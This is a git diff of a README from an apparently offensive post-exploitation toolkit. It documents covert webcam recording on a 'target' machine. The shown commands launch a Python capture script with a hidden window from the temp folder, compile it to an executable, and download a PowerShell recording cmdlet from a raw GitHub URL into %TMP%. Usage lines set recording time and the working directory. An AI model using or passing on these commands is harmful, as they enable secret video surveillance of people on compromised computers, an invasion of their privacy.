@@ -40,7 +40,7 @@ sys.path.append("c:\\users\\pedro\\appdata\\local\\programs\\python\\python39\\l
 cd $Env:TMP;Start-Process -WindowStyle hidden python3 -ArgumentList "WebCam.py"
 
 #Stop capture
-Stop-Process -Name "python3.9" -Force
+Stop-Process -Name "python3.*" -Force
 ```
 
 <br />
@@ -49,4 +49,45 @@ Stop-Process -Name "python3.9" -Force
 ```powershell
 Video recording its stored on WebCam.py current directory under the name: "outpy.avi"
 WebCam.py can be compiled to exe using pyinstaller: pyinstaller –onefile "WebCam.py"
+```
+
+<br /><br />
+
+
+## Invoke-WebCamAvi.ps1
+
+|Script Name|Description|Privileges|Notes|
+|---|---|---|---|
+|[Invoke-WebCamAvi](https://github.com/r00t-3xp10it/redpill/blob/main/lib/WebCam-Capture/Invoke-webcamAvi.ps1)|Capture video (AVI) using default target webcam|User Land|Credits: @AHLASaad \ @AvinabSaha<br />[write-a-video-using-opencv-python](https://learnopencv.com/read-write-and-display-a-video-using-opencv-cpp-python)|
+
+<br />
+
+**download script:**
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/Invoke-WebCamAvi.ps1" -OutFile "$Env:TMP\Invoke-WebCamAvi.ps1"
+```
+
+<br />
+
+**run cmdlet:**
+```powershell
+#Get module help
+Get-Help .\Invoke-WebCamAvi.ps1 -full
+
+#Record webcam live stream for 15 seconds time
+.\Invoke-WebCamAvi.ps1 -RecTime '15'
+
+#Record webcam live and use %TMP% as working directory
+.\Invoke-WebCamAvi.ps1 -WorkingDir "$Env:TMP"
+
+#Record webcam live and auto-start AVI file after finish?
+.\Invoke-WebCamAvi.ps1 -AutoView 'true'
+```
+
+<br />
+
+**Final Notes:**
+```powershell
+Invoke-WebCamAvi cmdlet automates the execution of [WebCam.py](https://github.com/r00t-3xp10it/redpill/blob/main/lib/WebCam-Capture/WebCam.py) and all is dependencies.
+Video recording its stored on WebCam.py current directory under the name: "outpy.avi"
 ```
